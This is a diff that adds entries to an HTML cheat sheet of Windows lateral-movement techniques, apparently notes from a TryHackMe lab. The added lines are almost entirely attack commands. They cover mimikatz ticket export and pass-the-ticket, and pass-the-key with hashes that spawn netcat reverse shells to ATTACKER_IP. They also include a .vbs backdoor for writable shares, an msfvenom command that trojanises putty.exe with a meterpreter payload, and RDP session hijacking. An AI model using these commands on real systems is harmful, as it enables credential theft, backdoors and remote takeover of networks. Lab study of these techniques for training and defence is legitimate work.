@@ -263,14 +263,36 @@ evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</code></pre></li>
                       <div>
                         <ul>
                           <li>Pass-the-Ticket</li>
+                          <ol>
+                            <li><pre><code class="language-powershell"></code>mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+
+mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.EXAMPLE.COM.kirbi
+</pre></li>
+                          </ol>
                           <li>Pass-the-Key</li>
+                          <ul>
+                            <li><pre><code class="language-powershell"></code></pre></li>
+                            <li>RC4: <pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"</code></pre></li>
+                            <li>AES128: <pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"</code></pre></li>
+                            <li>AES256: <pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"</code></pre></li>
+                            <li>Set up a reverse shell</li>
+                          </ul>
                         </ul>
                       </div>
                       <h4>User Behaviour</h4>
                       <div>
                         <ul>
                           <li>Backdooring Writeable Shares</li>
+                          <ol>
+                            <li>.vbs Scripts<pre><code class="language-powershell">CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% &amp; %tmp%\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 1234&quot;, 0, True</code></pre></li>
+                            <li>.exe Files<pre><code class="language-powershell">msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe</code></pre></li>
+                          </ol>
                           <li>RDP Hijacking</li>
+                          <ol>
+                            <li><pre><code class="language-powershell">query user</code></pre></li>
+                            <li><pre><code class="language-powershell">tscon 3 /dest:rdp-tcp#6</code></pre></li>
+                          </ol>
                         </ul>
                       </div>
                     </div>
